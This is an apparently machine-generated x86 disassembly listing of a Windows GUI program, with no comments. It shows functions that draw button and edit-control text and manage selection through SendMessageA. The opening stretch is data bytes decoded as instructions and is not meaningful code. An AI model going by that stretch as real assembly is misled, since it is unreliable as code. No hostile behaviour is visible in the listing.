inc ebx
add al cl
dec ebx
inc ebx
add [ esp + edx * 2 ] cl
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
lodsb [ esi ]
cmc
inc edx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
mov al 0xf4
inc edx
add [ eax - 0x13 ] ch
inc edx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
push [ eax ]
add dh bh
sbb al 0xdf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
mov eax [ ebx ]
clc
fld [ ebx ]
sub dh bl
inc ebx
add [ esi + edi * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
insb
jae r-xdata
inc edi
inc esp
add [ edi + eax * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
hlt
add [ ecx + ebp ] bh
inc ecx
add [ eax + eax ] bh
add dh bh
insb
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push eax
adc al [ ecx ]
adc [ edx ] al
add bh bh
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + edi * 2 - 0x7c ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add bh bh
in al dx
fiadd [ ebx ]
cld
fiadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
sub_4306f1
push es
inc ebx
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x74 ]
popad
je r-xdata
fwait
inc ebx
add [ eax + ebp * 4 + 0x41 ] dl
arpl [ edx + 0x6f ] ax
jb r-xdata
jb r-xdata
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
add [ eax + 0x8 ] dl
inc ebx
add [ edx + 0x8 ] ch
inc ebx
je r-xdata
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add [ eax + 0x73 ] bl
inc ebx
add [ esp + esi * 2 + 0x43 ] dl
add [ edx + esi + 0x40 ] dl
add [ eax + 0x4 ] cl
inc esp
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
push es
inc ebx
add [ edi ] al
jae r-xdata
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
add al 0x44
jae r-xdata
push esp
test al 0x41
outsd
outsb
or [ gs : ebx + 0x62 ] esi
jae r-xdata
xor al 0x40
add [ eax + 0x21 ] dh
imul ebp [ esi + 0x67 ] 0x7309656c
bound esi [ ebx + 0x53 ]
jne r-xdata
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
in al dx
imul esp [ ebp + 0x6e ] 0x8
push ebx
je r-xdata
je r-xdata
inc ebx
je r-xdata
inc esp
add al cl
add [ eax + eax - 0x68 ] al
je r-xdata
add ah ch
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ ecx + esi * 2 + 0x4c240043 ] bl
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add [ eax + 0x4374 ] bl
inc ecx
insb
jae r-xdata
inc esp
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add ah bl
and eax [ eax + eax ]
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add [ eax + eax ] al
cmp [ ebp - 0x4ff14ffa ] bh
adc dh [ eax + sub_4374ec ]
rol [ ebx ] cl
push esp
fld [ ebx ]
int3
add [ eax ] al
outsd
arpl [ ebx + 0x68 ] bp
pop [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
ror [ eax + 0x4307 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] 0x43
jb r-xdata
add [ edx + eax ] dl
add [ eax ] al
test [ ebx - 0x57abffbd ] bl
inc ecx
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
sub_4308b9
or [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x18004309
add al [ eax ]
add [ edi + eax ] bh
inc ebx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
add al 0x44
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add [ eax + 0x73 ] bl
inc ebx
add [ esp + esi * 2 + 0x43 ] dl
add ah ch
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ ecx + esi * 2 + 0x4c240043 ] bl
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add [ eax + 0x4374 ] bl
rol [ ebx ] cl
push esp
fld [ ebx ]
int3
sub_431214
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4462c0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43d5b4
mov edx 0x69
mov eax esi
call sub_43d5d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_431270
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440664
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41e3e0
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41e33c
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_4312dc
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43167e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41e3e0
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41e33c
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43ddf8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_4129b0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4129b0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x54 ]
call sub_404334
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x58 ]
call sub_404534
push eax
mov eax edi
call sub_41e4e4
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_4129b0
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41dbec
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41dbec
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41e000
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41dbec
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41e4e4
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431685
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_404098
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x60 ]
call sub_404754
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_404098
retn
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41e000
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43ddf8
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41e320
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_4129b0
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_4129b0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4048a0
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42c864
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42c8c8
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42c770
push 0x0
mov eax edi
call sub_41e4e4
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43ddf8
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_4400f0
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x80 ]
call sub_404334
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x84 ]
call sub_404534
push eax
mov eax edi
call sub_41e4e4
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41dbec
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x88 ]
call sub_404334
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x8c ]
call sub_404534
push eax
mov eax edi
call sub_41e4e4
push eax
call DrawTextA
sub_43168f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43170a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443a7c
mov eax ebx
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax ebx
call sub_444b58
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431711
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_43175c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445840
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43d5b4
mov edx 0x11
mov eax esi
call sub_43d5d8
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42c584
call sub_42c664
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_431808
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43195e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4400f0
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41e3e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40433c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x160 ]
call sub_41e4e4
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d400
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x160 ]
call sub_41e4e4
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41d400
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x160 ]
call sub_41e4e4
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431965
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43196f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_431b98
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41dd08
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41dbec
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41dd08
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41dfc4
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40349c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40349c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_431a90
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41e564
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40349c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41e564
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43ab84
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_431bd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_431b98
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431c34
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40349c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431c5c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d2c8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_431cc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431d4d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d54
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_431da4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440324
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43d5b4
mov edx 0x19
mov eax esi
call sub_43d5d8
mov dl 0x1
mov eax esi
call sub_44482c
xor edx edx
mov eax esi
call sub_43dfbc
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_4323d0
mov eax esi
test bl bl
je r-xdata
sub_431e4c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431ea4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_431ed4
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4445f8
push eax
call SendMessageA
test eax eax
setne bl
sub_431f0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431f44
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_431f68
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431f88
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_431fb8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_432070
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43dd6c
inc eax
call sub_4088e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4320fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4088f4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43dd7c
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432101
mov eax [ ebp - 0xc ]
call sub_40892c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_43210c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404164
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43dd6c
inc eax
call sub_4088e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43219a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4088f4
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dd7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40892c
retn
sub_4321a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441484
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4413b0
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
